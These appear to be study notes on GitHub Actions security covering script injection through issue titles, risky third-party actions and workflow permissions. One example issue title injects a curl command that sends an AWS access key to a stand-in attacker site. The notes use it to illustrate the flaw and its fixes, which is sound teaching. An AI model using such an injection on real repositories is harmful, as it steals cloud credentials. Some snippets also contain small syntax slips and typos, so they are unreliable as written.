# --------------------------------- SECURITY CONCERNS ----------------------------------
# Script Injection: A workflow that runs when issues are created and uses the title of the
#                   issue is vulnerable to code being injected in the title of the issue.

# Malicious Third-Party Actions: Actions can be used to steal you secrets or alter files

# Permission Issues: If your workflow has assigned read-only permissions is less exposed
#                    to any kind of attack


# --------------------------------- SCRIPT INJECTION EXAMPLE ---------------------------
# create issue with title
a"; curl http://my-bad-site.com?abc=$AWS_ACCES_KEY_ID"

# will send secrets to external site if code uses issue title like this for example:
issue_title="${{ github.event.issue.title }}"

# How to solve:
# a-) use action instead of "run:" that is handled by github outside of shell
# b-) use enviroment_variable instead of shell variable
env:
  TITLE: {{ github.event.issue.title }}


# ------------------------------ MALICIOUS THIRD-PARTY ACTIONS -------------------------
# Use only your own actions           -> Highest level of security but too much effort
# Use actions by verified creators    -> Verified creators are showed in marketplace

# Use all public Actions              -> Risk of malicious code 


# ------------------------------------ PERMISSION ISSUES -------------------------------
# you can define permissions inside the workflow
permissions: ...  # can also be added for the entire workflow here
jobs:
  my-workflow:
    permissions: read-all  # set for all

    permissions:           # setting per scopes
      issues: write        # rest of scopes will not get any access (not even read)

# TEMPORARY TOKEN
# A token is available in secrets.GITHUB_TOKEN while a workflow is running.
# The scope of the token depens on the permissions that were set.
# you can use the token to perform requests
# same token is used in actions such as actions/checkoutv4


# RESTRICT DEFAULT
# By default, permissions are set to read/write in almost all scopes
# To change to a more restrictive behavior you can go to 
# Settings/Actions/General/Workflow permissions and change to:
# Read repository contents permission

# OPEN ID CONNECT
# Instead of using a token, you can configure this type of permissions
# that last a short amount of time and only have access to what the actions requires
